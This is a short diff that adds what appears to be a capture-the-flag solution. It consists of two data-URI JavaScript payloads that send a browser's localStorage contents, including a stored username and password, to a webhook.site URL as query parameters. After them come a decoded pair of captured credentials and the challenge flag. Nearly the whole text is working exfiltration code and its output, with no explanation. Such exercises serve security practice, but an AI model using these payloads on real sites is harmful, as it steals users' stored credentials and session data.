@@ -1,0 +1,10 @@
+
+data: window.location = "https://webhook.site/8cda91cf-9e4b-4ed8-8655-11770f30a4ec/?id=" + localStorage.getItem("username") + "&pw=" + localStorage.getItem("password")//;base64,VGhpcyBVUkwgaGFzIG5vIGRlZmF1bHQgY29udGVudCBjb25maWd1cmVkLiA8YSBocmVmPSJodHRwczovL3dlYmhvb2suc2l0ZS8jIS92aWV3LzhjZGE5MWNmLTllNGItNGVkOC04NjU1LTExNzcwZjMwYTRlYyI+VmlldyBpbiBXZWJob29rLnNpdGU8L2E+Lg==
+
+data: window.location = "https://webhook.site/8cda91cf-9e4b-4ed8-8655-11770f30a4ec/?d=" + btoa(JSON.stringify(window.localStorage))//
+
+
+atob("eyJ1c2VybmFtZSI6Ijk1ZDhmMDRlNjQ1YjZlOTQ5Y2FlMjQ0N2ZiOWQ0OWU2IiwicGFzc3dvcmQiOiIwMDQyNjFkN2E0MDI1MjQ2Yjk5NGZiOTA5ZmMyZWZkYyJ9")
+{ "username": "95d8f04e645b6e949cae2447fb9d49e6", "password": "004261d7a4025246b994fb909fc2efdc" }
+
+actf{ c4d8f38d1195fda4b7e025f40e16942e }
